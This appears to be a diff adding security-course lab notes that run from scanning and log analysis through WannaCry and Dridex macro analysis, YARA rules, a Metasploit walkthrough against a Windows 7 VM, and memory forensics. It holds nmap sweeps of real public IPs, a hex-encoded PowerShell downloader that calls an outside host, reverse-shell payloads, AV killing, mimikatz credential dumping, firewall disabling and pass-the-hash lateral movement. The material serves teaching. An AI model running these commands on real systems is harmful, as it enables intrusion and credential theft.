@@ -1,0 +1,1997 @@
+The purpose of this class is to help students learn how to address the common issues in Hacking Challenge Lab courses.
+ 
+ 
+Issue 1. Lack of a thorough attack process
+==========================================
+    - Host discovery   
+    - Service discovery
+    - Service version discovery
+    - Vulnerability research
+    - Linux (port 111)/Window (port 445) Enumeration
+    - Webserver vulnerability scan
+    - Directory brute force every webserver
+    - Analyze source code of every web app (look for IPs, usernames/passwords, explanations of how stuff works)
+    - Brute force all services
+ 
+ 
+Issue 2. Lack of automation of the process
+==========================================
+    - Research attacks scripts on the internet to enhance your methodology
+ 
+ 
+Issue 3. Failing to document all steps being performed and their output
+=======================================================================
+ 
+ 
+Issue 4. Lack of sleep during the exam
+======================================
+ 
+ 
+Issue 5. Failing to reboot target machines prior to attack
+==========================================================
+ 
+ 
+ 
+--------------------------------------------------------------------------------------------------------------
+ 
+ 
+A good strategy to use to prepare would be:
+ 
+Step 1. Ensure that you are comfortable with Linux
+--------------------------------------------------
+- LinuxSurvival.com (you should be able to comfortably pass all 4 quizzes)
+- Comptia Linux+ (You should be just a hair under a Linux system administrator in skill level, simple shell scripting, and well beyond a Linux user skill level)
+ 
+You should be very comfortable with the material covered in the videos below (Go through all of them twice if you are new to Linux):
+https://www.youtube.com/playlist?list=PLCDA423AB5CEC8FDB
+https://www.youtube.com/playlist?list=PLtK75qxsQaMLZSo7KL-PmiRarU7hrpnwK
+https://www.youtube.com/playlist?list=PLcUid3OP_4OXOUqYTDGjq-iEwtBf-3l2E
+ 
+ 
+ 
+2. You should be comfortable with the following tools:
+------------------------------------------------------
+ 
+Nmap:
+https://www.youtube.com/playlist?list=PL6gx4Cwl9DGBsINfLVidNVaZ-7_v1NJIo
+ 
+Metasploit:
+https://www.youtube.com/playlist?list=PL6gx4Cwl9DGBmwvjJoWhM4Lg5MceSbsja
+ 
+Burp Suite:
+https://www.youtube.com/playlist?list=PLv95pq8fEyuivHeZB2jeC435tU3_1YGzV
+ 
+Sqlmap:
+https://www.youtube.com/playlist?list=PLA3E1E7A07FD60C75
+ 
+Nikto:
+https://www.youtube.com/watch?v=GH9qn_DBzCk
+ 
+Enum4Linux:
+https://www.youtube.com/watch?v=hA5raaGOQKQ
+ 
+RPCINFO/SHOWMOUNT:
+https://www.youtube.com/watch?v=FlRAA-1UXWQ
+ 
+Hydra:
+https://www.youtube.com/watch?v=rLtj8tEmGso
+ 
+ 
+ 
+3. You need to comfortable with basic exploit development
+---------------------------------------------------------
+ 
+Basic assembly:
+https://www.youtube.com/playlist?list=PLue5IPmkmZ-P1pDbF3vSQtuNquX0SZHpB
+ 
+Basic exploit development (first 5 videos in the playlist):
+https://www.youtube.com/playlist?list=PLWpmLW-3AVsjcz_VJFvofmIFVTk7T-Ukl
+ 
+ 
+4. You need to be comfortable with privilege escalation
+-------------------------------------------------------
+Linux
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+ 
+Windows
+https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+http://www.fuzzysecurity.com/tutorials/16.html
+ 
+ 
+ 
+ 
+                            #################################
+----------- ############### # Day 1: Advanced Scanning Labs # ############### -----------
+                            #################################
+ 
+ 
+########################
+# Scanning Methodology #
+########################
+ 
+- Ping Sweep
+What's alive?
+------------
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sP 157.166.226.*
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+    -if -SP yields no results try:
+---------------------------Type This-----------------------------------
+sudo nmap -sL 157.166.226.*
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+    -Look for hostnames:
+---------------------------Type This-----------------------------------
+sudo nmap -sL 157.166.226.* | grep com
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Port Scan
+What's where?
+------------
+---------------------------Type This-----------------------------------
+sudo nmap -sS 162.243.126.247
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Bannergrab/Version Query
+What versions of software are running
+-------------------------------------
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sV 162.243.126.247
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Vulnerability Research
+Lookup the banner versions for public exploits
+----------------------------------------------
+http://exploit-db.com
+http://securityfocus.com/bid
+https://packetstormsecurity.com/files/tags/exploit/
+
+
+
+
+
+
+##############################################
+# Log Analysis with Linux command-line tools #
+##############################################
+The following command line executables are found in the Mac as well as most Linux Distributions.
+ 
+cat –  prints the content of a file in the terminal window
+grep – searches and filters based on patterns
+awk –  can sort each row into fields and display only what is needed
+sed –  performs find and replace functions
+sort – arranges output in an order
+uniq – compares adjacent lines and can report, filter or provide a count of duplicates
+ 
+ 
+##############
+# Cisco Logs #
+##############
+ 
+-----------------------------Type this-----------------------------------------
+wget https://s3.amazonaws.com/infosecaddictsfiles/cisco.log
+-------------------------------------------------------------------------------
+ 
+AWK Basics
+----------
+To quickly demonstrate the print feature in awk, we can instruct it to show only the 5th word of each line. Here we will print $5. Only the last 4 lines are being shown for brevity.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | awk '{print $5}' | tail -n 4
+-------------------------------------------------------------------------------
+ 
+ 
+ 
+Looking at a large file would still produce a large amount of output. A more useful thing to do might be to output every entry found in “$5”, group them together, count them, then sort them from the greatest to least number of occurrences. This can be done by piping the output through “sort“, using “uniq -c” to count the like entries, then using “sort -rn” to sort it in reverse order.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | awk '{print $5}'| sort | uniq -c | sort -rn
+-------------------------------------------------------------------------------
+ 
+ 
+ 
+While that’s sort of cool, it is obvious that we have some garbage in our output. Evidently we have a few lines that aren’t conforming to the output we expect to see in $5. We can insert grep to filter the file prior to feeding it to awk. This insures that we are at least looking at lines of text that contain “facility-level-mnemonic”.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | grep %[a-zA-Z]*-[0-9]-[a-zA-Z]* | awk '{print $5}' | sort | uniq -c | sort -rn
+-------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+Now that the output is cleaned up a bit, it is a good time to investigate some of the entries that appear most often. One way to see all occurrences is to use grep.
+ 
+-----------------------------Type this-----------------------------------------
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| awk '{print $10}' | sort | uniq -c | sort -rn
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10}' | sort | uniq -c | sort -rn
+ 
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10 " changed to " $14}' | sort | uniq -c | sort -rn
+--------------------------------------------------------------------------------
+
+
+################################
+# Good references for WannaCry #
+################################
+ 
+References:
+ 
+https://gist.github.com/rain-1/989428fa5504f378b993ee6efbc0b168
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+ 
+############################
+# Download the Analysis VM #
+############################
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user: infosecaddicts
+pass: infosecaddicts
+ 
+ 
+ 
+- Log in to your Ubuntu system with the username 'infosecaddicts' and the password 'infosecaddicts'.
+ 
+ 
+ 
+ 
+ 
+ 
+################
+# The Scenario #
+################
+You've come across a file that has been flagged by one of your security products (AV Quarantine, HIPS, Spam Filter, Web Proxy, or digital forensics scripts).
+ 
+ 
+The fastest thing you can do is perform static analysis.
+ 
+ 
+ 
+###################
+# Static Analysis #
+###################
+ 
+- After logging please open a terminal window and type the following commands:
+ 
+ 
+---------------------------Type This-----------------------------------
+cd Desktop/
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/wannacry.zip
+ 
+unzip wannacry.zip
+     infected
+ 
+file wannacry.exe
+ 
+mv wannacry.exe malware.pdf
+ 
+file malware.pdf
+ 
+mv malware.pdf wannacry.exe
+ 
+hexdump -n 2 -C wannacry.exe
+ 
+----------------------------------------------------------------------
+ 
+ 
+***What is '4d 5a' or 'MZ'***
+Reference:
+http://www.garykessler.net/library/file_sigs.html
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings --all wannacry.exe | head -n 6
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Hmmmmm.......what's the latest thing in the news - oh yeah "WannaCry"
+ 
+Quick Google search for "wannacry ransomeware analysis"
+ 
+ 
+Reference
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+- Yara Rule -
+ 
+ 
+Strings:
+$s1 = “Ooops, your files have been encrypted!” wide ascii nocase
+$s2 = “Wanna Decryptor” wide ascii nocase
+$s3 = “.wcry” wide ascii nocase
+$s4 = “WANNACRY” wide ascii nocase
+$s5 = “WANACRY!” wide ascii nocase
+$s7 = “icacls . /grant Everyone:F /T /C /Q” wide ascii nocase
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+Ok, let's look for the individual strings
+ 
+ 
+---------------------------Type This-----------------------------------
+strings wannacry.exe | grep -i ooops
+ 
+strings wannacry.exe | grep -i wanna
+ 
+strings wannacry.exe | grep -i wcry
+ 
+strings wannacry.exe | grep -i wannacry
+ 
+strings wannacry.exe | grep -i wanacry          **** Matches $s5, hmmm.....
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+####################################
+# Tired of GREP - let's try Python #
+####################################
+Decided to make my own script for this kind of stuff in the future. I
+ 
+Reference1:
+https://s3.amazonaws.com/infosecaddictsfiles/analyse_malware.py
+ 
+This is a really good script for the basics of static analysis
+ 
+Reference:
+https://joesecurity.org/reports/report-db349b97c37d22f5ea1d1841e3c89eb4.html
+ 
+ 
+This is really good for showing some good signatures to add to the Python script
+ 
+ 
+Here is my own script using the signatures (started this yesterday, but still needs work):
+https://pastebin.com/guxzCBmP
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo apt install -y python-pefile
+     infosecaddicts
+ 
+ 
+ 
+wget https://pastebin.com/raw/guxzCBmP
+ 
+ 
+mv guxzCBmP am.py
+ 
+ 
+vi am.py
+ 
+python am.py wannacry.exe
+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+##############
+# Yara Ninja #
+##############
+----------------------------------------------------------------------
+cd ~/Desktop
+ 
+sudo apt-get remove -y yara
+     infosecaddcits
+ 
+sudo apt -y install libtool
+     infosecaddicts
+ 
+wget https://github.com/VirusTotal/yara/archive/v3.6.0.zip
+ 
+ 
+unzip v3.6.0.zip
+ 
+cd yara-3.6.0
+ 
+./bootstrap.sh
+ 
+./configure
+ 
+make
+ 
+sudo make install
+    infosecaddicts
+ 
+yara -v
+ 
+cd ~/Desktop
+----------------------------------------------------------------------
+ 
+ 
+ 
+NOTE:
+McAfee is giving these yara rules - so add them to the hashes.txt file
+ 
+Reference:
+https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/
+ 
+----------------------------------------------------------------------------
+rule wannacry_1 : ransom
+{
+    meta:
+        author = "Joshua Cannell"
+        description = "WannaCry Ransomware strings"
+        weight = 100
+        date = "2017-05-12"
+ 
+    strings:
+        $s1 = "Ooops, your files have been encrypted!" wide ascii nocase
+        $s2 = "Wanna Decryptor" wide ascii nocase
+        $s3 = ".wcry" wide ascii nocase
+        $s4 = "WANNACRY" wide ascii nocase
+        $s5 = "WANACRY!" wide ascii nocase
+        $s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
+ 
+    condition:
+        any of them
+}
+ 
+----------------------------------------------------------------------------
+rule wannacry_2{
+    meta:
+        author = "Harold Ogden"
+        description = "WannaCry Ransomware Strings"
+        date = "2017-05-12"
+        weight = 100
+ 
+    strings:
+        $string1 = "msg/m_bulgarian.wnry"
+        $string2 = "msg/m_chinese (simplified).wnry"
+        $string3 = "msg/m_chinese (traditional).wnry"
+        $string4 = "msg/m_croatian.wnry"
+        $string5 = "msg/m_czech.wnry"
+        $string6 = "msg/m_danish.wnry"
+        $string7 = "msg/m_dutch.wnry"
+        $string8 = "msg/m_english.wnry"
+        $string9 = "msg/m_filipino.wnry"
+        $string10 = "msg/m_finnish.wnry"
+        $string11 = "msg/m_french.wnry"
+        $string12 = "msg/m_german.wnry"
+        $string13 = "msg/m_greek.wnry"
+        $string14 = "msg/m_indonesian.wnry"
+        $string15 = "msg/m_italian.wnry"
+        $string16 = "msg/m_japanese.wnry"
+        $string17 = "msg/m_korean.wnry"
+        $string18 = "msg/m_latvian.wnry"
+        $string19 = "msg/m_norwegian.wnry"
+        $string20 = "msg/m_polish.wnry"
+        $string21 = "msg/m_portuguese.wnry"
+        $string22 = "msg/m_romanian.wnry"
+        $string23 = "msg/m_russian.wnry"
+        $string24 = "msg/m_slovak.wnry"
+        $string25 = "msg/m_spanish.wnry"
+        $string26 = "msg/m_swedish.wnry"
+        $string27 = "msg/m_turkish.wnry"
+        $string28 = "msg/m_vietnamese.wnry"
+ 
+ 
+    condition:
+        any of ($string*)
+}
+----------------------------------------------------------------------------
+ 
+ 
+#######################
+# External DB Lookups #
+#######################
+ 
+Creating a malware database (sqlite)
+---------------------------Type This-----------------------------------
+sudo apt install -y python-simplejson python-simplejson-dbg
+    infosecaddicts
+ 
+ 
+ 
+wget https://raw.githubusercontent.com/mboman/mart/master/bin/avsubmit.py
+ 
+ 
+ 
+python avsubmit.py -f wannacry.exe -e
+----------------------------------------------------------------------
+ 
+Analysis of the file can be found at:
+http://www.threatexpert.com/report.aspx?md5=84c82835a5d21bbcf75a61706d8ab549
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###############################
+# Creating a Malware Database #
+###############################
+Creating a malware database (mysql)
+-----------------------------------
+- Step 1: Installing MySQL database
+- Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+sudo apt install -y mysql-server
+     infosecaddicts
+     
+- Step 2: Installing Python MySQLdb module
+- Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+sudo apt-get build-dep python-mysqldb
+     infosecaddicts
+ 
+sudo apt install -y python-mysqldb
+     infosecaddicts
+ 
+Step 3: Logging in
+Run the following command in the terminal:
+---------------------------Type This-----------------------------------
+mysql -u root -p                    (set a password of 'malware')
+ 
+- Then create one database by running following command:
+ 
+create database malware;
+ 
+exit;
+ 
+wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py
+ 
+vi mal_to_db.py                     (fill in database connection information)
+ 
+python mal_to_db.py -i
+ 
+------- check it to see if the files table was created ------
+ 
+mysql -u root -p
+    malware
+ 
+show databases;
+ 
+use malware;
+ 
+show tables;
+ 
+describe files;
+ 
+exit;
+ 
+---------------------------------
+ 
+ 
+- Now add the malicious file to the DB
+---------------------------Type This-----------------------------------
+python mal_to_db.py -f wannacry.exe -u
+ 
+ 
+ 
+- Now check to see if it is in the DB
+---------------------------Type This-----------------------------------
+mysql -u root -p
+    malware
+ 
+mysql> use malware;
+ 
+select id,md5,sha1,sha256,time FROM files;
+ 
+mysql> quit;
+
+
+#####################################################
+# Analyzing Macro Embedded Malware                  #
+# Reference:                                        #
+# https://jon.glass/analyzes-dridex-malware-p1/     #
+#####################################################
+---------------------------Type This-----------------------------------
+cd ~/Desktop/
+ 
+ 
+sudo pip install olefile
+     
+ 
+mkdir ~/Desktop/oledump
+ 
+cd ~/Desktop/oledump
+ 
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+ 
+unzip oledump_V0_0_22.zip
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/064016.zip
+ 
+unzip 064016.zip
+     infected
+ 
+python oledump.py 064016.doc
+ 
+python oledump.py 064016.doc -s A4 -v
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams.
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A5 -v
+-----------------------------------------------------------------------
+ 
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+ 
+---------------------------Type This-----------------------------------
+python oledump.py 064016.doc -s A3 -v
+ 
+- Look for "GVhkjbjv" and you should see:
+ 
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+ 
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+
+
+
+#########################################
+# FreeFloat FTP Server Exploit Analysis #
+#########################################
+
+
+
+Analyze the following exploit code:
+https://www.exploit-db.com/exploits/15689/
+
+What is the target platform that this exploit works against?
+What is the variable name for the distance to EIP? 
+What is the actual distance to EIP in bytes?
+Describe what is happening in the variable ‘junk2’
+
+
+
+
+Analysis of the training walk-through based on EID: 15689:
+https://s3.amazonaws.com/infosecaddictsfiles/ff.zip
+
+
+
+
+ff1.py
+What does the sys module do? Call System Commands
+What is sys.argv[1] and sys.argv[2]? 
+What application entry point is being attacked in this script? 
+
+
+
+ff2.py
+Explain what is happening in lines 18 - 20 doing. 
+What pattern_create.rb doing and where can I find it? 
+Why can’t I just double click the file to run this script? 
+
+
+
+ff3.py
+Explain what is happening in lines 17 - to 25? 
+Explain what is happening in lines 30 - to 32? 
+Why is everything below line 35 commented out? 
+
+
+
+ff4.py
+Explain what is happening in lines 13 - to 15. 
+Explain what is happening in line 19. 
+Why is everything below line 35 commented out? 
+
+
+
+Ff5.py 
+Explain what is happening in line 15. 
+What is struct.pack?
+How big is the shellcode in this script? 
+
+
+
+ff6.py
+What is the distance to EIP? 
+How big is the shellcode in this script? 
+What is the total byte length of the data being sent to this app? 
+
+
+
+
+ff7.py
+What is a tuple in python? 
+How big is the shellcode in this script? 
+Did your app crash in from this script?
+
+
+
+
+ff8.py
+How big is the shellcode in this script? 
+What is try/except in python? 
+What is socket.SOCK_STREAM in Python?
+
+
+
+ff9.py
+What is going on in lines 19 and 20?
+What is the length of the NOPs? 
+What is socket.SOCK_STREAM in Python? 
+
+
+
+
+ff010.py
+What is going on in lines 18 - 20? 
+What is going on in lines 29 - 32? 
+How would a stack adjustment help this script?
+
+
+
+
+
+########################################
+# Boot up the StrategicSec Ubuntu host #
+# You can also boot up the Win7 as well#
+########################################
+ 
+- Log in to your Ubuntu host with the following credentials:
+        user: strategicsec
+        pass: strategicsec
+ 
+ 
+ 
+- I prefer to use Putty to SSH into my Ubuntu host on pentests and I'll be teaching this class in the same manner that I do pentests.
+- You can download Putty from here:
+- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+ 
+- For the purpose of this workshop my Win7 VM IP address is: Win7-VM-IP so anytime you see that IP you'll know that's my Win7 VM
+- StrategicSec-VM-IP is my Ubuntu IP address so anytime you see that IP you'll know that's my Ubuntu host
+ 
+- Type the following commands
+---------------------------Type This-----------------------------------
+sudo /sbin/iptables -F
+   
+ 
+cd ~/toolz/metasploit
+-----------------------------------------------------------------------
+ 
+#######################
+# Attacking Windows 7 #
+#######################
+ 
+---------------------------Type This-----------------------------------
+sudo /sbin/iptables -F
+ 
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use exploit/windows/browser/ie_cgenericelement_uaf
+ 
+set ExitOnSession false
+ 
+set URIPATH /ie8
+ 
+set PAYLOAD windows/meterpreter/reverse_tcp
+ 
+set LHOST StrategicSec-VM-IP                                            
+ 
+exploit -j
+-----------------------------------------------------------------------
+ 
+- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
+- given to you by metasploit.
+ 
+- The address will be something like:
+ 
+http://StrategicSec-VM-IP:8080/ie8                                            
+ 
+ 
+ 
+- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
+ 
+ 
+###########################
+# Client-Side Enumeration #
+###########################
+ 
+ 
+- You can list the active sessions by typing:
+---------------------------Type This-----------------------------------
+sessions -l
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
+ 
+---------------------------Type This-----------------------------------
+sessions -i 1
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- You should now see Metasploit's meterpreter prompt.
+ 
+ 
+********************************** Figure out who and where you are **********************************
+ 
+ 
+---------------------------Type This-----------------------------------
+meterpreter> sysinfo
+ 
+ 
+meterpreter> getuid
+ 
+ 
+meterpreter> ipconfig
+ 
+ 
+meterpreter> run post/windows/gather/checkvm
+ 
+ 
+meterpreter> run get_local_subnets
+ 
+ 
+ 
+********************************** Escalate privileges and get hashes **********************************
+ 
+ 
+---------------------------Type This-----------------------------------
+meterpreter> use priv
+ 
+ 
+--Option 1: GetSystem
+---------------------------Type This-----------------------------------
+meterpreter> getsystem
+ 
+--Option 2:
+---------------------------Type This-----------------------------------
+meterpreter > run post/windows/escalate/getsystem
+ 
+--Option 3:
+---------------------------Type This-----------------------------------
+meterpreter> background
+back
+use post/windows/escalate/droplnk
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 1234
+exploit
+ 
+--Option 4:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/bypassuac
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 12345
+exploit
+ 
+--Option 5:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/service_permissions
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 5555
+exploit
+ 
+--Option 6:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/trusted_service_path
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 4567
+exploit
+ 
+ 
+--Option 7:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ppr_flatten_rec
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 7777
+exploit
+ 
+--Option 8:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ms_ndproxy
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 7788
+exploit
+ 
+ 
+--Option 9:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ask
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST StrategicSec-VM-IP                                            
+set LPORT 7799
+exploit
+ 
+ 
+meterpreter > getuid
+Server username: win7-64-victim\Workshop
+ 
+meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
+ 
+meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
+ 
+meterpreter > getsystem
+...got system (via technique 1).
+ 
+ 
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+ 
+ 
+meterpreter> run killav
+ 
+meterpreter> run post/windows/gather/hashdump
+ 
+meterpreter> run post/windows/gather/credentials/credential_collector
+ 
+ 
+********************************** Steal Tokens **********************************
+ 
+---------------------------Type This-----------------------------------
+meterpreter > getsystem
+ 
+meterpreter > use incognito
+ 
+meterpreter > list_tokens -u
+ 
+meterpreter > list_tokens -g
+ 
+meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
+ 
+meterpreter> getuid
+ 
+ 
+************ Stealing credentials and certificates ************
+- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
+ 
+---------------------------Type This-----------------------------------
+meterpreter > getsystem
+ 
+meterpreter > load mimikatz
+ 
+meterpreter > kerberos
+ 
+meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
+ 
+meterpreter > msv                                                               <-- Your AD password
+ 
+meterpreter > livessp                                                           <-- Your Windows8 password
+ 
+meterpreter > ssp                                                               <-- Your outlook password
+ 
+meterpreter > tspkg                                                             <-- Your AD password
+ 
+meterpreter > wdigest                                                           <-- Your AD password
+ 
+meterpreter > mimikatz_command -f crypto::listStores
+ 
+meterpreter > mimikatz_command -f crypto::listCertificates
+ 
+meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
+ 
+meterpreter > mimikatz_command -f crypto::patchcapi
+ 
+meterpreter> search -d <directory> -f <file-pattern>
+ 
+ 
+********************************** Enumerate the host you are on **********************************
+ 
+ 
+---------------------------Type This-----------------------------------
+meterpreter > run getcountermeasure
+ 
+meterpreter> run winenum
+ 
+meterpreter > run post/windows/gather/enum_applications
+ 
+meterpreter > run post/windows/gather/enum_logged_on_users
+ 
+meterpreter > run post/windows/gather/usb_history
+ 
+meterpreter > run post/windows/gather/enum_shares
+ 
+meterpreter > run post/windows/gather/enum_snmp
+ 
+meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+ 
+ 
+********************************** FIX PSEXEC **********************************
+ 
+- We use the shell command to get to the Victim Dos command so we can add a registry field.
+ 
+---------------------------Type This-----------------------------------
+meterpreter > execute -c -H -f cmd -a "/k" -i
+reg /?
+ 
+ 
+- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
+ 
+---------------------------Type This-----------------------------------
+C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1
+ 
+ 
+c:\Windows\system32> netsh advfirewall set allprofiles state off
+ 
+********************************** Lateral Movement *******************************
+ 
+ 
+Now we can run the PSEXEC exploit.
+-- Option 1:
+---------------------------Type This-----------------------------------
+use exploit/windows/smb/psexec
+ 
+set SMBUser Workshop
+ 
+set SMBPass password
+ 
+set RHOST Win7-VM-IP
+ 
+set payload windows/meterpreter/reverse_tcp
+ 
+set LHOST StrategicSec-VM-IP
+ 
+set LPORT 2345
+ 
+exploit
+ 
+ 
+ 
+ 
+-- Option 2:
+---------------------------Type This-----------------------------------
+use exploit/windows/smb/psexec
+ 
+set SMBUser Workshop
+ 
+set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+ 
+set payload windows/meterpreter/reverse_tcp
+ 
+set RHOST Win7-VM-IP                      
+ 
+set LHOST StrategicSec-VM-IP
+ 
+set LPORT 5678
+ 
+exploit
+
+
+
+
+###################
+# Memory Analysis #
+###################
+---------------------------Type This-----------------------------------
+cd  ~/toolz/
+
+mkdir mem_analysis
+
+cd mem_analysis
+ 
+sudo apt-get install -y foremost tcpxtract
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/hn_forensics.vmem
+ 
+git clone https://github.com/volatilityfoundation/volatility.git
+ 
+cd volatility
+sudo pip install distorm3
+sudo python setup.py install
+python vol.py -h
+python vol.py pslist -f ../hn_forensics.vmem
+python vol.py connscan -f ../hn_forensics.vmem
+mkdir dump/
+mkdir -p output/pdf/
+cd dump/
+python vol.py -f ../hn_forensics.vmem memdump -p 888 -D dump/
+python vol.py -f ../hn_forensics.vmem memdump -p 1752 -D dump/
+                ***Takes a few min***
+strings 1752.dmp | grep "^http://" | sort | uniq
+strings 1752.dmp | grep "Ahttps://" | uniq -u
+cd ..
+foremost -i 1752.dmp -t pdf -o ../output/pdf/
+cd ../output/pdf/
+cat audit.txt
+cd pdf
+ls
+grep -i javascript *.pdf
+ 
+ 
+wget http://didierstevens.com/files/software/pdf-parser_V0_6_4.zip
+unzip pdf-parser_V0_6_4.zip
+python pdf-parser.py -s javascript --raw 00601560.pdf
+python pdf-parser.py --object 11 00601560.pdf
+python pdf-parser.py --object 1054 --raw --filter 00601560.pdf > malicious.js
+ 
+cat malicious.js
+ -----------------------------------------------------------------------
+ 
+                            ######################
+----------- ############### # Intro to Reversing # ############### -----------
+                            ######################
+Lab walk-through documents are in the zip file along with the executables that need to be reversed:
+https://s3.amazonaws.com/infosecaddictsfiles/Lena151.zip
+
+
+
+#############################
+# Understanding Snort rules #
+#############################
+Field 1: Action - Snort can process events in 1 of 3 ways (alert, log, drop)
+ 
+Field 2: Protocol - Snort understands a few types of traffic (tcp, udp, icmp)
+ 
+Field 3: Source IP (can be a variable like $External_Net, or an IP, or a range)
+ 
+Field 4: Source Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
+ 
+Field 5: Traffic Direction (->)
+ 
+Field 6: Destination IP (can be a variable like $External_Net, or an IP, or a range)
+ 
